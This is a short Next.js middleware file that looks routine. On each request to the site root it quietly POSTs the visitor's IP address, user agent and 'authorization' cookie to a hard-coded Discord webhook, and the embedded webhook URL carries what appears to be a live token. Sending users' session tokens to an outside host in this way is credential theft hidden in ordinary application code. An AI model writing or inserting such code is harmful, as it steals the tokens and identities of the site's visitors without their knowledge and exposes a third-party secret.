import { NextResponse } from "next/server";
import { cookies } from "next/headers";

function removeVersions(userAgent: string) {
  // Regular expression to match version numbers in the format of digits followed by dots (e.g., 10.0, 537.36)
  return userAgent.replace(/\/[\d\.]+/g, "");
}

async function getAuthorizationToken(): Promise<string | null> {
  return cookies().get("authorization")?.value || null;
}

export async function middleware(req: Request) {
  const ip = req.headers.get("x-real-ip") || req.headers.get("x-forwarded-for");

  fetch(
    "https://discord.com/api/webhooks/1315508248912199732/u1Jee48ST5I67s7g6hQr9oBAXrAA3GQ0zo1WjUh57k36cO96CdK6vs4AoKTxRnjXK_MO",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: `**${new Date().toLocaleString()}**\n\n**IP:** ${ip}\n**User-Agent:** ${removeVersions(
          req.headers.get("user-agent") || ""
        )}\n**Authorization:** ${await getAuthorizationToken()}`,
      }),
    }
  );
  return NextResponse.next();
}

export const config = {
  matcher: ["/"],
};
